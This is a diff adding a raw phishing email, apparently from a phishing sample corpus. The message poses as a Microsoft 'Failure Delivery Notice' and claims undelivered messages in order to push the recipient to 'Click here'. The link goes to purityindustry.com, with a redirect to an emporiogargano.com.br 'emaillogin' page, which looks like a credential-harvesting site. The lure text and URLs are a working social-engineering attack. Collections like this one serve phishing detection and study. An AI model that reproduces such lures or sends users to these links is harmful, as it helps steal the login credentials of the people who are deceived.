@@ -1,0 +1,180 @@
+Return-Path: MAILER-DAEMON
+Delivered-To: jose@monkey.org
+X-FDA: 79100515620.41.51DD260
+Received: from out.smarshmail.com (out.smarshmail.com [199.193.206.147])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 2C12A45D1A
+	for <jose@monkey.org>; Thu,  3 Feb 2022 06:38:49 +0000 (UTC)
+Received: from MBX125-W8-CO-3.exch125.serverpod.net (10.224.13.216) by
+ MBX125-W6-CO-3.exch125.serverpod.net (10.224.13.192) with Microsoft SMTP
+ Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521) id
+ 15.1.2375.18; Wed, 2 Feb 2022 22:38:45 -0800
+Received: from good.3s1h5yny3alulazo13v53fqeke.bx.internal.cloudapp.net
+ (13.90.200.76) by MBX125-W8-CO-3.exch125.serverpod.net (10.224.13.216) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384_P521) id 15.1.2375.18; Wed, 2
+ Feb 2022 22:38:40 -0800
+Content-Type: multipart/alternative; boundary="===============1876153626=="
+MIME-Version: 1.0
+Subject: Mail System Error - Returned Mail - jose@monkey.org
+To: <jose@monkey.org>
+From: Mail Delivery System
+Date: Thu, 3 Feb 2022 06:38:39 +0000
+Message-ID: <f942474d-93f1-4703-919c-270bdbd5cb4f@MBX125-W8-CO-3.exch125.serverpod.net>
+X-Originating-IP: [13.90.200.76]
+X-ClientProxiedBy: MBX125-W6-CO-3.exch125.serverpod.net (10.224.13.192) To
+ MBX125-W8-CO-3.exch125.serverpod.net (10.224.13.216)
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf05.b.hostedemail.com: domain of out.smarshmail.com has no SPF policy when checking 199.193.206.147) smtp.helo=out.smarshmail.com
+X-Rspam-User: nil
+X-Spam-Status: No, score=3.11
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 2C12A45D1A
+X-Stat-Signature: 79di8t69ixoxmtptuegz6wdecyou6o48
+X-HE-Tag: 1643870329-196739
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 11
+
+--===============1876153626==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Microsoft Failure Delivery Notice.
+  User: jose@monkey.org =
+
+ (3) pending sent messages couldn't be delivered =
+
+ =
+
+ * Action Required.    =
+
+* How to Fix It. =
+
+Click here to view undelivered sent messages. =
+
+ Created Date: 02. 03. 2021 =
+
+ =
+
+ =
+
+ Disclaimer: The content of this message and any attachments with it is int=
+ended only for the named recipients. Information contained in this message =
+may be subject to legal, professional or other privilege or may otherwise b=
+e protected by other legal rules. If you are not the intended recipient you=
+ are not authorized to disclose, copy, distribute or retain this message or=
+ any part of it. If you have received this message in error, please notify =
+the sender and destroy the original message. Any opinion expressed in this =
+communication may be personal to the author and may not necessarily reflect=
+ the opinion of the IT manager. While we scan all emails, we cannot guarant=
+ee that any email is virus-free and accept liability for damages caused by =
+any virus transmitted by this email.
+--===============1876153626==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P style=3D"FONT-SIZE: small; FONT-FAMILY: Ari=
+al, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRA=
+NSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; O=
+RPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255=
+,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps:=
+ normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
+; text-decoration-style: initial; text-decoration-color: initial"><STRONG>M=
+icrosoft Failure Delivery Notice.</STRONG></P>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">User:&nbsp;<STRONG>jose@monkey.org</STRONG></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px"><BR></DIV>
+<P style=3D"COLOR: rgb(32,31,30)">(3) pending sent messages couldn't be del=
+ivered&nbsp;</P>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px"><BR></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px"><B>*<SPAN>&nbsp;</SPAN></B>Action Required.&nbsp;=
+ &nbsp;&nbsp;<BR><B>*</B><SPAN>&nbsp;</SPAN>How to Fix It.
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px"><BR><STRONG><SPAN style=3D"COLOR: rgb(0,0,255)"><A style=3D"COLOR: rgb(=
+17,85,204)" href=3D"https://purityindustry.com/systemerror/NewestUpdate/?em=
+ail=3Djose@monkey.org" target=3D_blank data-saferedirecturl=3D"https://www.=
+google.com/url?q=3Dhttps://emporiogargano.com.br/mail/emaillogin.html&amp;s=
+ource=3Dgmail&amp;ust=3D1643904751644000&amp;usg=3DAOvVaw3iG4fkk3XevadonE1w=
+M7g-">Click here</A></SPAN>&nbsp;</STRONG>to view undelivered sent messages=
+.</DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px"><BR></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px">Created&nbsp;Date: 02. 03. 2021</DIV></DIV></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><BR></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><BR></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><FONT color=3D#cccccc size=3D1><BR><=
+/FONT></DIV>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-thickness: initial; text-decoration-style: in=
+itial; text-decoration-color: initial"><FONT color=3D#cccccc size=3D1><U><S=
+PAN style=3D"FONT-FAMILY: Arial, Helvetica, sans-serif, serif, EmojiFont"><=
+B>Disclaimer</B></SPAN></U><SPAN style=3D"FONT-FAMILY: Arial, Helvetica, sa=
+ns-serif, serif, EmojiFont">: The content of this message and any attachmen=
+ts with it is intended only for the named recipients. Information contained=
+ in this message may be subject to legal, professional or other privilege o=
+r may otherwise be protected by other legal rules. If you are not the inten=
+ded recipient you are not authorized to disclose, copy, distribute or retai=
+n this message or any part of it.&nbsp;If you have received this message in=
+ error, please notify the sender and destroy the original message. Any opin=
+ion expressed in this communication may be personal to the author and may n=
+ot necessarily reflect the opinion of the IT manager. While we scan all ema=
+ils, we cannot guarantee that any email is virus-free and accept liability =
+for damages caused by any virus transmitted by this email.</SPAN></FONT></D=
+IV></BODY></HTML>
+--===============1876153626==--
+
